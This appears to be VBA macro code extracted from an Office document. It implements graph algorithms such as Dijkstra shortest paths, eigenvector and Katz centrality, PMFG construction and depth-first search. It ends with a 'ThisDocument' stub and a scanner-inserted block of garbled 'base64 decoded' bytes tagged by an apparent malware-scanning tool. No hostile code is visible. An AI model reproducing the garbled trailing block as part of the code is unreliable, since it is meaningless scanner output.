    If pnode_degree(i) > max_degree Then max_degree = pnode_degree(i)
Next i

'First identify the neigbours of each node
ReDim neighbour(1 To pSize, 1 To max_degree)
ReDim neighbour_dist(1 To pSize, 1 To max_degree)
ReDim sort_index(1 To pSize)
For n = 1 To pn_edge
    i = pEdgeList(n, 1)
    j = pEdgeList(n, 2)
    tmp_x = pEdgeDist(n)
    sort_index(i) = sort_index(i) + 1
    sort_index(j) = sort_index(j) + 1
    neighbour(i, sort_index(i)) = j
    neighbour(j, sort_index(j)) = i
    neighbour_dist(i, sort_index(i)) = tmp_x
    neighbour_dist(j, sort_index(j)) = tmp_x
Next n
Erase sort_index

'Dijkstra's algorithm
ReDim d(1 To pSize)
ReDim dist(1 To pSize, 1 To pSize)
For s = 1 To pSize

    If s Mod 50 = 0 Then
        DoEvents
        Application.StatusBar = "cMST: Dijkstra..." & s & "/" & pSize
    End If

    Set q = New cHeap
    Call q.Init

    For v = 1 To pSize
        d(v) = INFINITY
    Next v

    Call q.Add(0, s)
    d(s) = 0
    Do While q.Size > 0
        Call q.Pop_Min(d_min, u)
        For i = 1 To pnode_degree(u)
            v = neighbour(u, i)
            tmp_x = d(u) + neighbour_dist(u, i)
            If tmp_x < d(v) Then
                d(v) = tmp_x
                Call q.Add(tmp_x, v)
            End If
        Next i
    Loop

    For v = 1 To pSize
        dist(s, v) = d(v)
    Next v

Next s
Call q.Reset
Set q = Nothing
Erase d, neighbour, neighbour_dist
Application.StatusBar = False
End Sub


Sub Find_Eigen(Optional iter_max As Long = 10000, Optional tolerance As Double = 0.0000000001)
Dim i As Long, j As Long, k As Long, iterate As Long
Dim x() As Double, tmp_x As Double, eigen_val As Double
Dim tmpBool As Boolean

Call Me.Find_degree
eigen_val = 0
ReDim pnode_eigen(1 To pSize)
For i = 1 To pSize
    pnode_eigen(i) = pnode_degree(i)
    eigen_val = eigen_val + pnode_eigen(i) ^ 2
Next i
eigen_val = Sqr(eigen_val)
For i = 1 To pSize
    pnode_eigen(i) = pnode_eigen(i) / eigen_val
Next i

tmpBool = PowerIterate(pnode_eigen, tmp_x, iter_max, tolerance)

If tmpBool = False Then
    Debug.Print "cGraphAlgo:Find_Eigen: has not converged. Possible degeneracy. Err=" & Format(tmp_x, "0.00E+00") & _
        ". Taking average of last two iterations."
    x = pnode_eigen
    tmpBool = PowerIterate(x, tmp_x, 1, tolerance)
    For i = 1 To pSize
        pnode_eigen(i) = (pnode_eigen(i) + x(i)) / 2
    Next i
    tmpBool = PowerIterate(pnode_eigen, tmp_x, iter_max, tolerance)
    If tmpBool = False Then
        Debug.Print "cGraphAlgo:Find_Eigen: Still no convergence. Err=" & Format(tmp_x, "0.00E+00")
    Else
        Debug.Print "cGraphAlgo:Find_Eigen: Reachieve convergence. Err=" & Format(tmp_x, "0.00E+00")
    End If
End If

End Sub


Private Function PowerIterate(vec_guess() As Double, ConvChk As Double, Optional iter_max As Long = 10000, Optional tolerance As Double = 0.0000000001) As Boolean
Dim i As Long, j As Long, k As Long, iterate As Long
Dim x() As Double, tmp_x As Double, tmp_y As Double, eigen_val As Double
    For iterate = 1 To iter_max
        ReDim x(1 To pSize)
        For k = 1 To pn_edge
            i = pEdgeList(k, 1)
            j = pEdgeList(k, 2)
            x(i) = x(i) + vec_guess(j)
            x(j) = x(j) + vec_guess(i)
        Next k
        eigen_val = 0
        tmp_x = 0
        For i = 1 To pSize
            eigen_val = eigen_val + x(i) ^ 2
            tmp_x = tmp_x + x(i) * vec_guess(i)
        Next i
        eigen_val = Sgn(tmp_x) * Sqr(eigen_val)
        For i = 1 To pSize
            x(i) = x(i) / eigen_val
        Next i
        tmp_x = tmp_x / eigen_val
        tmp_x = Abs(tmp_x - 1)
        vec_guess = x
        If tmp_x < tolerance Then Exit For
    Next iterate
    Erase x
    If iterate >= iter_max Then
        PowerIterate = False
    Else
        PowerIterate = True
    End If
    ConvChk = tmp_x
    Erase x
End Function


'=== Find Katz Centrality x() s.t.
'=== $$x_i=\alpha \sum_j A_{ij} x_j + \beta$$
Sub Find_Katz(Optional alpha As Double = 0.1, Optional beta As Double = 1, _
        Optional iter_max As Long = 10000, Optional tol As Double = 0.0000000001)
Dim i As Long, j As Long, k As Long, iterate As Long
Dim x() As Double, tmp_x As Double, tmp_y As Double, norm As Double
    Call Me.Find_degree
    ReDim pnode_Katz(1 To pSize)
    For i = 1 To pSize
        pnode_Katz(i) = pnode_degree(i)
    Next i
    For iterate = 1 To iter_max
        ReDim x(1 To pSize)
        For k = 1 To pn_edge
            i = pEdgeList(k, 1)
            j = pEdgeList(k, 2)
            x(i) = x(i) + pnode_Katz(j)
            x(j) = x(j) + pnode_Katz(i)
        Next k
        tmp_x = 0
        For i = 1 To pSize
            x(i) = alpha * x(i) + beta
            tmp_x = tmp_x + Abs(x(i) - pnode_Katz(i))
        Next i
        pnode_Katz = x
        If tmp_x < tol Then Exit For
    Next iterate
    If iterate >= iter_max Then Debug.Print "Find_Katz: no convergence."
    Erase x
End Sub


Private Sub mTranspose(A As Variant, B As Variant)
Dim i As Long, j As Long, m As Long, n As Long
    m = UBound(A, 1)
    n = UBound(A, 2)
    ReDim B(1 To n, 1 To m)
    For i = 1 To m
        For j = 1 To n
            B(j, i) = A(i, j)
        Next j
    Next i
End Sub

Private Sub condense2sq(k As Long, n As Long, i As Long, j As Long)
    i = Application.WorksheetFunction.Ceiling(((n - 0.5) - Sqr((n - 0.5) ^ 2 - 2 * k)), 1)
    j = k + i - (i - 1) * (2 * n - i) / 2
End Sub



'=== Build Planar Maximally Filtered Graph from a pairwise distance matrix
'Input: Symmetric Distance(N x N) matrix
Sub PMFG_Build(distance() As Double)
Dim i As Long, j As Long, m As Long, n As Long, k As Long, n_pairs As Long
Dim node_index() As Long, sort_index() As Long, AdjMatrix() As Long, included_nodes() As Long
Dim theGraph As cPMFG_Graph
Dim isPlanar As String
Dim M_is_new As Boolean, N_is_new As Boolean
Dim d() As Double

pSize = UBound(distance, 1)
n_pairs = pSize * (pSize - 1) / 2
ReDim pnode_idx(1 To pSize)
For i = 1 To pSize
    pnode_idx(i) = i
Next i

k = 0
ReDim d(1 To n_pairs)
For i = 1 To pSize - 1
    For j = i + 1 To pSize
        k = k + 1
        d(k) = distance(i, j)
    Next j
Next i

Application.StatusBar = "Building PMFG: Sorting distances...."
Call modMath.Sort_Quick_A(d, 1, n_pairs, sort_index)

'=== Construct PMFG
pn_edge = 0
ReDim included_nodes(0 To 0)
ReDim node_index(1 To pSize)
ReDim edge_stat(1 To n_pairs)
ReDim AdjMatrix(1 To 2, 1 To 1)
ReDim pEdgeList(1 To 3 * pSize - 6, 1 To 2)
ReDim pEdgeDist(1 To 3 * pSize - 6)
For i = 1 To n_pairs
    edge_stat(i) = False
Next i

For i = 1 To n_pairs

    DoEvents
    Application.StatusBar = "Contructing PMFG..." & pn_edge & " / " & (3 * pSize - 6)

    j = sort_index(i)
    Call condense2sq(j, pSize, m, n)

    'Temporarily include this edge
    edge_stat(j) = True
    pn_edge = pn_edge + 1
    M_is_new = Add_Node(included_nodes, m, node_index)
    N_is_new = Add_Node(included_nodes, n, node_index)

    'Construct temporary adjacency matrix
    ReDim Preserve AdjMatrix(1 To 2, 1 To pn_edge)
    AdjMatrix(1, pn_edge) = node_index(m) - 1
    AdjMatrix(2, pn_edge) = node_index(n) - 1

    'Check if the graph is planar, it not try the next edge
    Call gp.ReadAdjMatrix(theGraph, AdjMatrix, UBound(included_nodes))
    isPlanar = gp_Embed.Embed(theGraph)

    If isPlanar <> "OK" Then
        'restore to previous state
        edge_stat(j) = False
        pn_edge = pn_edge - 1
        ReDim Preserve AdjMatrix(1 To 2, 1 To pn_edge)
        If N_is_new = True Then Call Delete_Node(included_nodes, n, node_index)
        If M_is_new = True Then Call Delete_Node(included_nodes, m, node_index)
    ElseIf isPlanar = "OK" Then
        pEdgeList(pn_edge, 1) = m
        pEdgeList(pn_edge, 2) = n
        pEdgeDist(pn_edge) = d(i)
    End If

    If pn_edge >= (3 * pSize - 6) Then Exit For

Next i
'==============================

If pn_edge <> (3 * pSize - 6) Or UBound(included_nodes) <> pSize Then
    Debug.Print "PMFG_Build Fail: Num of edges is not equal to 3N-6"
End If

Erase sort_index, d
Erase included_nodes, node_index, edge_stat, AdjMatrix
Application.StatusBar = False

Randomize
ReDim pnode_pos(1 To pSize, 1 To 2)
For i = 1 To pSize
    pnode_pos(i, 1) = (-0.5 + Rnd()) * Sqr(pSize)
    pnode_pos(i, 2) = (-0.5 + Rnd()) * Sqr(pSize)
Next i
End Sub

Private Function Add_Node(included_nodes() As Long, m As Long, node_index() As Long) As Boolean
Dim i As Long, k As Long, n As Long
Add_Node = False
If node_index(m) = 0 Then
    n = UBound(included_nodes) + 1
    ReDim Preserve included_nodes(0 To n)
    included_nodes(n) = m
    node_index(m) = n
    Add_Node = True
End If
End Function

Private Sub Delete_Node(included_nodes() As Long, m As Long, node_index() As Long)
Dim i As Long, k As Long, n As Long
If node_index(m) > 0 Then
    n = UBound(included_nodes)
    If node_index(m) < n Then
        For i = node_index(m) + 1 To n
            node_index(included_nodes(i)) = node_index(included_nodes(i)) - 1
            included_nodes(i - 1) = included_nodes(i)
        Next i
    End If
    ReDim Preserve included_nodes(0 To n - 1)
    node_index(m) = 0
End If
End Sub


Sub Convert_ADJ_LIST_2_EDGE_LIST(AdjDist As Variant, AdjIdx As Variant, EdgeList() As Long, EdgeDist() As Double, n_node As Long, n_edge As Long)
Dim i As Long, j As Long, k As Long, m As Long, n As Long
Dim xArr() As Double, iArr() As Long, PairList() As Long
Dim isReverse As Boolean
    n_node = UBound(AdjDist, 1)
    n_edge = 0
    ReDim EdgeDist(1 To 1)
    ReDim PairList(1 To 2, 1 To 1)
    If VBA.TypeName(AdjDist) = "Double()" And VBA.TypeName(AdjIdx) = "Long()" Then
        For i = 1 To n_node
            For m = 1 To UBound(AdjDist, 2)
                j = AdjIdx(i, m)
                If j > 0 Then
                    isReverse = False
                    For k = 1 To n_edge
                        If (PairList(1, k) = i And PairList(2, k) = j) Or (PairList(1, k) = j And PairList(2, k) = i) Then
                            isReverse = True
                            Exit For
                        End If
                    Next k
                    If isReverse = False Then
                        n_edge = n_edge + 1
                        ReDim Preserve PairList(1 To 2, 1 To n_edge)
                        ReDim Preserve EdgeDist(1 To n_edge)
                        PairList(1, n_edge) = i
                        PairList(2, n_edge) = j
                        EdgeDist(n_edge) = AdjDist(i, m)
                    End If
                End If
            Next m
        Next i
    Else
        For i = 1 To n_node
            xArr = AdjDist(i)
            iArr = AdjIdx(i)
            For m = 1 To UBound(iArr, 1)
                j = iArr(m)
                isReverse = False
                For k = 1 To n_edge
                    If (PairList(1, k) = i And PairList(2, k) = j) Or (PairList(1, k) = j And PairList(2, k) = i) Then
                        isReverse = True
                        Exit For
                    End If
                Next k
                If isReverse = False Then
                    n_edge = n_edge + 1
                    ReDim Preserve PairList(1 To 2, 1 To n_edge)
                    ReDim Preserve EdgeDist(1 To n_edge)
                    PairList(1, n_edge) = i
                    PairList(2, n_edge) = j
                    EdgeDist(n_edge) = xArr(m)
                End If
            Next m
        Next i
    End If
    ReDim EdgeList(1 To n_edge, 1 To 2)
    For i = 1 To n_edge
        EdgeList(i, 1) = PairList(1, i)
        EdgeList(i, 2) = PairList(2, i)
    Next i
    Erase PairList, xArr, iArr
End Sub


Sub Convert_EDGE_LIST_2_ADJ_LIST(EdgeList() As Long, EdgeDist() As Double, _
        AdjDist As Variant, AdjIdx As Variant, n_node As Long, n_edge As Long, Optional force_n_node As Long = 0)
Dim i As Long, j As Long, k As Long, m As Long, n As Long, kk As Long
Dim xArr() As Double, iArr() As Long, sort_idx() As Long, tmp_x As Double
    n_edge = UBound(EdgeList, 1)
    If force_n_node > 0 Then
        n_node = force_n_node
    Else
        n_node = 0
        For k = 1 To n_edge
            If EdgeList(k, 1) > n_node Then n_node = EdgeList(k, 1)
            If EdgeList(k, 2) > n_node Then n_node = EdgeList(k, 2)
        Next k
    End If
    xArr = EdgeDist
    Call modMath.Sort_Quick_A(xArr, 1, n_edge, sort_idx, 1)
    Erase xArr
    
    If VBA.TypeName(AdjDist) = "Double()" And VBA.TypeName(AdjIdx) = "Long()" Then
        m = 0
        ReDim iArr(1 To n_node)
        For kk = 1 To n_edge
            k = sort_idx(kk)
            i = EdgeList(k, 1)
            j = EdgeList(k, 2)
            iArr(i) = iArr(i) + 1
            iArr(j) = iArr(j) + 1
        Next kk
        For i = 1 To n_node
            If iArr(i) > m Then m = iArr(i)
        Next i
        ReDim iArr(1 To n_node)
        ReDim AdjIdx(1 To n_node, 1 To m)
        ReDim AdjDist(1 To n_node, 1 To m)
        For kk = 1 To n_edge
            k = sort_idx(kk)
            i = EdgeList(k, 1)
            j = EdgeList(k, 2)
            tmp_x = EdgeDist(k)
            iArr(i) = iArr(i) + 1
            AdjIdx(i, iArr(i)) = j
            AdjDist(i, iArr(i)) = tmp_x
            iArr(j) = iArr(j) + 1
            AdjIdx(j, iArr(j)) = i
            AdjDist(j, iArr(j)) = tmp_x
        Next kk
        Erase iArr, sort_idx
    Else
        ReDim xArr(0 To 0)
        ReDim iArr(0 To 0)
        ReDim AdjDist(1 To n_node)
        ReDim AdjIdx(1 To n_node)
        For i = 1 To n_node
            AdjDist(i) = xArr
            AdjIdx(i) = iArr
        Next i
        
        For kk = 1 To n_edge
    
            k = sort_idx(kk)
            i = EdgeList(k, 1)
            j = EdgeList(k, 2)
            tmp_x = EdgeDist(k)
            
            iArr = AdjIdx(i)
            xArr = AdjDist(i)
            m = UBound(iArr, 1)
            If m > 0 Then
                ReDim Preserve iArr(1 To m + 1)
                ReDim Preserve xArr(1 To m + 1)
            Else
                ReDim iArr(1 To 1)
                ReDim xArr(1 To 1)
            End If
            iArr(m + 1) = j
            xArr(m + 1) = tmp_x
            AdjIdx(i) = iArr
            AdjDist(i) = xArr
    
            iArr = AdjIdx(j)
            xArr = AdjDist(j)
            m = UBound(iArr, 1)
            If m > 0 Then
                ReDim Preserve iArr(1 To m + 1)
                ReDim Preserve xArr(1 To m + 1)
            Else
                ReDim iArr(1 To 1)
                ReDim xArr(1 To 1)
            End If
            iArr(m + 1) = i
            xArr(m + 1) = tmp_x
            AdjIdx(j) = iArr
            AdjDist(j) = xArr
        Next kk
        Erase xArr, iArr, sort_idx
    End If
End Sub


Function count_component(AdjList As Variant, AdjDist As Variant, Optional input_format = "ADJ_LIST", _
            Optional com_size As Variant, Optional com_idx As Variant) As Long
Dim i As Long, j As Long, k As Long, m As Long, n As Long, u As Long, v As Long
Dim n_node As Long, n_edge As Long, n_component As Long, n_visit As Long, n_stack As Long
Dim isVisited() As Long, vstack() As Long, iArr() As Long, xArr() As Double
Dim AdjD As Variant, AdjIdx As Variant, component_size() As Long, component_idx() As Long
    If input_format = "ADJ_LIST" Then
        n = UBound(AdjList, 1)
        If VBA.TypeName(AdjList) = "Long()" Then
            ReDim AdjIdx(1 To n)
            m = UBound(AdjList, 2)
            ReDim iArr(1 To m)
            For i = 1 To n
                For j = 1 To m
                    iArr(j) = AdjList(i, j)
                Next j
                AdjIdx(i) = iArr
            Next i
        Else
            AdjIdx = AdjList
        End If
    ElseIf input_format = "EDGE_LIST" Then
        iArr = AdjList
        xArr = AdjDist
        Call Convert_EDGE_LIST_2_ADJ_LIST(iArr, xArr, AdjD, AdjIdx, n, n_edge)
        Erase iArr, xArr, AdjD
    End If
    
    n_component = 0
    ReDim component_size(1 To 1)
    ReDim component_idx(1 To n)
    ReDim vstack(1 To n)
    ReDim isVisited(1 To n)
    n_visit = 0
    n_stack = 1
    vstack(1) = 1
    Do
        n_component = n_component + 1
        ReDim Preserve component_size(1 To n_component)
        If n_component > 1 Then
            n_stack = 1
            For i = 1 To n
                If isVisited(i) = 0 Then
                    vstack(n_stack) = i
                    Exit For
                End If
            Next i
        End If
        Do While n_stack > 0
            i = vstack(n_stack)
            n_stack = n_stack - 1
            If isVisited(i) = 0 Then
                n_visit = n_visit + 1
                isVisited(i) = n_visit
                iArr = AdjIdx(i)
                For m = UBound(iArr) To 1 Step -1
                    j = iArr(m)
                    If isVisited(j) = 0 Then
                        n_stack = n_stack + 1
                        If n_stack > UBound(vstack) Then ReDim Preserve vstack(1 To n_stack)
                        vstack(n_stack) = j
                    End If
                Next m
                component_idx(i) = n_component
                component_size(n_component) = component_size(n_component) + 1
                If n_visit = n Then Exit Do
            End If
        Loop
    Loop While n_visit < n
    count_component = n_component

    'Sort to label largest component as 1
    Call modMath.Sort_Quick_A(component_size, 1, n_component, iArr, 1)
    Call Reverse_Vec(component_size)
    Call Reverse_Vec(iArr)
    For i = 1 To n
        For j = 1 To n_component
            If iArr(j) = component_idx(i) Then
                component_idx(i) = j
                Exit For
            End If
        Next j
    Next i

    If IsMissing(com_size) = False Then com_size = component_size
    If IsMissing(com_idx) = False Then com_idx = component_idx
End Function

Private Sub Reverse_Vec(x As Variant)
Dim i As Long, n As Long
Dim u As Variant, v As Variant
    n = UBound(x, 1)
    For i = 1 To n \ 2
        u = x(i)
        x(i) = x(n - i + 1)
        x(n - i + 1) = u
    Next i
End Sub

'Perform topological sort on graph with depth first search
'Output: x_visited(1:N), x_visited(i)=j means node i is visited at the j-th step
'        i_start, index of node to start at
'        v_path, variant array to show plot DFS path in Excel
'        v_path_back, variant array to show backward edge separately, if not supplied they will be append to v_path
Sub Sort_DFS(x_visited() As Long, Optional i_start As Long = 1, _
        Optional v_path As Variant, Optional v_path_back As Variant, Optional print_path As Boolean = False)
Dim i As Long, j As Long, k As Long, m As Long, n As Long, p As Long, u As Long
Dim mm As Long, n_visited As Long, n_edge As Long, n_stack As Long, n_component As Long
Dim isBacktrack As Boolean, print_back_edge As Boolean
Dim x_stack() As Long, iArr() As Long, x_parent() As Long
Dim vArr As Variant, AdjDist As Variant, AdjIdx As Variant
Dim x_path() As Long, x_path_back() As Long

    Call Convert_EDGE_LIST_2_ADJ_LIST(pEdgeList, pEdgeDist, AdjDist, AdjIdx, n, n_edge, pSize)

    'Depth-First-Search traverse from first node
    i = i_start: n_visited = 0
    ReDim x_visited(1 To n) 'ordering of nodes
    ReDim x_stack(1 To n)   'stack of visited nodes, use n_stack to indicate top of stack
    ReDim x_parent(1 To n)  'immediate parent of each node

    'path of nodes visited, with spacers in between for charting purpose
    If print_path = True Then
        ReDim x_path(0 To 0)
        ReDim x_path_back(0 To 0)
    End If
    
    n_component = 0
    n_stack = 1
    x_stack(1) = i_start
    Do
        n_component = n_component + 1
        If n_component > 1 Then
            n_stack = 1
            For i = 1 To n
                If x_visited(i) = 0 Then
                    x_stack(1) = i
                    Exit For
                End If
            Next i
        End If
        u = 0
        Do While n_stack > 0
            i = x_stack(n_stack)
            n_stack = n_stack - 1
            If print_path = True Then
                'if parent of i is not the node from previous iteration
                'this has to be a branch, add spacer for chart
                If u <> x_parent(i) Then
                    m = UBound(x_path, 1)
                    ReDim Preserve x_path(0 To m + 3)
                    x_path(m + 2) = x_parent(i)
                    x_path(m + 3) = i
                Else
                    m = UBound(x_path, 1) + 1
                    ReDim Preserve x_path(0 To m)
                    x_path(m) = i
                End If
            End If
            If x_visited(i) = 0 Then
                n_visited = n_visited + 1
                x_visited(i) = n_visited
                iArr = AdjIdx(i)
                For k = UBound(iArr) To 1 Step -1
                    j = iArr(k)
                    If x_visited(j) = 0 Then
                        'if node is not visited but has parent assigned,
                        'that {j i parent(j)} forms a cycle and j is already
                        'in the stack, no need to add it again
                        If x_parent(j) = 0 Then
                            x_parent(j) = i
                            n_stack = n_stack + 1
                            If n_stack > UBound(x_stack) Then ReDim Preserve x_stack(1 To n_stack)
                            x_stack(n_stack) = j
                        End If
                    ElseIf x_visited(j) < x_visited(i) And j <> x_parent(i) Then
                        'Cycle found, add a back edge
                        If print_path = True Then
                            m = UBound(x_path_back, 1)
                            If m = 0 Then m = -1
                            ReDim Preserve x_path_back(0 To m + 3)
                            x_path_back(m + 2) = i
                            x_path_back(m + 3) = j
                        End If
                    End If
                Next k
                If n_visited = n Then Exit Do
            End If
            u = i
        Loop
        'Start new component with a spacer
        If print_path = True Then
            If n_visited < n Then
                m = UBound(x_path, 1) + 1
                ReDim Preserve x_path(0 To m)
                m = UBound(x_path_back, 1) + 1
                ReDim Preserve x_path_back(0 To m)
            End If
        End If
    Loop While n_visited < n

    'Output path for charting
    If print_path = True Then
        If IsMissing(v_path_back) = False Then
            'Show forward arc and back-edge separately
            m = UBound(x_path)
            ReDim v_path(1 To m, 1 To UBound(pnode_pos, 2))
            For i = 1 To m
                j = x_path(i)
                If j > 0 Then
                    For p = 1 To UBound(pnode_pos, 2)
                        v_path(i, p) = pnode_pos(j, p)
                    Next p
                End If
            Next i
            m = UBound(x_path_back)
            If m > 0 Then
                ReDim v_path_back(1 To m, 1 To UBound(pnode_pos, 2))
                For i = 1 To m
                    j = x_path_back(i)
                    If j > 0 Then
                        For p = 1 To UBound(pnode_pos, 2)
                            v_path_back(i, p) = pnode_pos(j, p)
                        Next p
                    End If
                Next i
            Else
                Debug.Print "Sort_DFS: no back-edge found."
                ReDim v_path_back(0 To 0)
            End If
        Else
            'Combine forward and backward edges into one chart
            m = UBound(x_path) + UBound(x_path_back) + 1
            ReDim v_path(1 To m, 1 To UBound(pnode_pos, 2))
            For i = 1 To UBound(x_path)
                j = x_path(i)
                If j > 0 Then
                    For p = 1 To UBound(pnode_pos, 2)
                        v_path(i, p) = pnode_pos(j, p)
                    Next p
                End If
            Next i
            For i = 1 To UBound(x_path_back)
                j = x_path_back(i)
                If j > 0 Then
                    For p = 1 To UBound(pnode_pos, 2)
                        v_path(UBound(x_path) + 1 + i, p) = pnode_pos(j, p)
                    Next p
                End If
            Next i
        End If
    End If

End Sub



''Perform topological sort on graph
''Output: x_visited(1:N), x_visited(i)=j means node i is visited at the j-th step
''        x_path, variant array to show plot DFS path in Excel
''        i_start, index of node to start at
'Sub Sort_DFS(x_visited() As Long, Optional i_start As Long = 1, Optional x_path As Variant)
'Dim i As Long, j As Long, k As Long, m As Long, n As Long, p As Long, u As Long
'Dim mm As Long, n_visited As Long, n_edge As Long
'Dim isBacktrack As Boolean, print_path As Boolean
'Dim x_stack() As Long, iArr() As Long
'Dim vArr As Variant, AdjDist As Variant, AdjIdx As Variant
'
'    Call Convert_EDGE_LIST_2_ADJ_LIST(pEdgeList, pEdgeDist, AdjDist, AdjIdx, n, n_edge, pSize)
'
'    print_path = False
'    If IsMissing(x_path) = False Then print_path = True
'
'    'Depth-First-Search traverse from first node
'    i = i_start: n_visited = 0: mm = 0
'    ReDim x_visited(1 To n) 'ordering of nodes
'    ReDim x_stack(1 To n)   'stack of visited nodes, use mm to indicate top of stack
'    isBacktrack = False     'whether current step is a backtrack
'    'path of nodes visited, with spacers in between for charting purpose
'    If print_path = True Then
'        m = 0
'        ReDim x_path(0 To 0)
'    End If
'
'    Do
'        If print_path = True Then
'            If isBacktrack = False Then
'                m = UBound(x_path, 1) + 1
'                ReDim Preserve x_path(0 To m)
'                x_path(m) = i
'            End If
'        End If
'        If x_visited(i) = 0 Then
'            mm = mm + 1
'            x_stack(mm) = i
'            n_visited = n_visited + 1
'            x_visited(i) = n_visited
'            If n_visited = n Then Exit Do
'        End If
'        u = i
'        iArr = AdjIdx(i)
'        For k = 1 To UBound(iArr)
'            j = iArr(k)
'            If j = 0 Then Exit For
'            If x_visited(j) = 0 Then
'                '=== found a branch on backtracking, add spacer to path for charting purpose
'                If print_path = True Then
'                    If k > 1 And isBacktrack = True Then
'                        m = UBound(x_path, 1) + 2
'                        ReDim Preserve x_path(0 To m)
'                        x_path(m) = i
'                    End If
'                End If
'                '================
'                i = j
'                isBacktrack = False
'                Exit For
'            End If
'        Next k
'        If u = i Then   'No new node found, start backtracking
'            isBacktrack = True
'            mm = mm - 1
'            If mm > 0 Then 'Unwind stack to backtrack
'                i = x_stack(mm)
'            Else 'stack exhausted, stop backtracking and find next component
'                isBacktrack = False
'                For j = 1 To n
'                    If x_visited(j) = 0 Then
'                        i = j
'                        Exit For
'                    End If
'                Next j
'                'Start new component with a spacer
'                If print_path = True Then
'                    m = UBound(x_path, 1) + 1
'                    ReDim Preserve x_path(0 To m)
'                End If
'            End If
'        End If
'    Loop While n_visited < n
'
'    'Output path for charting
'    If print_path = True Then
'        m = UBound(x_path)
'        ReDim vArr(1 To m, 1 To UBound(pnode_pos, 2))
'        For i = 1 To m
'            j = x_path(i)
'            If j > 0 Then
'                For p = 1 To UBound(pnode_pos, 2)
'                    vArr(i, p) = pnode_pos(j, p)
'                Next p
'            End If
'        Next i
'        x_path = vArr
'    End If
'
'End Sub


Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' H9TA
' Y< ;5.
' /CO4GR
' [7-(&9
' 	9TI.QE
' L17>1?$
' 9T^R 
' 	C4GR
' [7-(&9PHA
' HAC;

INQUEST-PP=macro
